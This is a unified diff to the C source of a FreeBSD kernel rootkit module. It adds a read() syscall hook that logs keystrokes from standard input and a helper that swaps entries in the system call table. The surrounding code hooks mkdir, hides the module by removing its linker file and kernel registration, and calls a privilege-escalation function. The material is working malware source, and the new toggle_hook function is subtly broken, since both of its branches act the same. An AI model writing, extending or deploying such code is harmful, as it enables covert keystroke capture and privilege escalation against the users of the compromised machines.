@@ -35,7 +35,7 @@
 
 
 void escalate_privledge(struct thread * td);
-
+void toggle_hook(char * state, int sys_call_num, void*dest_func);
 
 static int mkdir_hook(struct thread *td, void *syscall_args){
 	struct mkdir_args*uap;
@@ -59,6 +59,35 @@ static int mkdir_hook(struct thread *td, void *syscall_args){
 	return(sys_mkdir(td, syscall_args));
 }
 
+static int read_hook(struct thread *td, void * syscall_args){
+	struct read_args * uap;
+	uap = (struct read_args *)syscall_args;
+
+	int error; 
+	char buf[1];
+	int done;
+
+	error = sys_read(td, syscall_args);
+
+	if(error || (!uap->nbyte) || (uap->nbyte > 1) || (uap->fd != 0)){
+		return(error);
+	}
+
+	copyinstr(uap->buf, buf, 1, &done);
+
+	printf("%c\n", buf[0]);
+
+	return(error);
+}
+
+void toggle_hook(char * state, int sys_call_num, void*dest_func){
+	if(strcmp(state, "on")){
+		sysent[sys_call_num].sy_call = (sy_call_t*)dest_func;
+		return;
+	}
+	sysent[sys_call_num].sy_call = (sy_call_t*)dest_func;
+}
+
 
 static int
 load(struct module *module, int cmd, void *arg)
@@ -66,12 +95,14 @@ load(struct module *module, int cmd, void *arg)
         switch(cmd) {
         case MOD_LOAD:
                 LOGI("[rootkit:load] Rootkit loaded.\n");
-				sysent[SYS_mkdir].sy_call = (sy_call_t*)mkdir_hook;
-                remove_linker_file("rootkit.ko");
+				toggle_hook(ON, SYS_mkdir, mkdir_hook);
+				toggle_hook(ON, SYS_read, read_hook);	
+				remove_linker_file("rootkit.ko");
 				remove_module_from_kernel("rootkit");
 				break;
         case MOD_UNLOAD:
-				sysent[SYS_mkdir].sy_call = (sy_call_t*)sys_mkdir;
+				toggle_hook(OFF, SYS_mkdir, sys_mkdir);
+				toggle_hook(OFF, SYS_read, sys_read);
                 LOGI("[rootkit:load] Rootkit unloaded.\n");
                 break;
         default:
@@ -91,6 +122,12 @@ static moduledata_t rootkit_mod = {
 
 static moduledata_t mkdir_hook_mod = {
 	"mkdir_hook",
+	load,
+	NULL
+};
+
+static moduledata_t read_hook_mod = {
+	"read_hook",
 	load,
 	NULL
 };
@@ -155,6 +192,6 @@ void escalate_privledge(struct thread * td){
 }
 
 
-
+DECLARE_MODULE(read_hook, read_hook_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
 DECLARE_MODULE(mkdir_hook, mkdir_hook_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
 DECLARE_MODULE(rootkit, rootkit_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
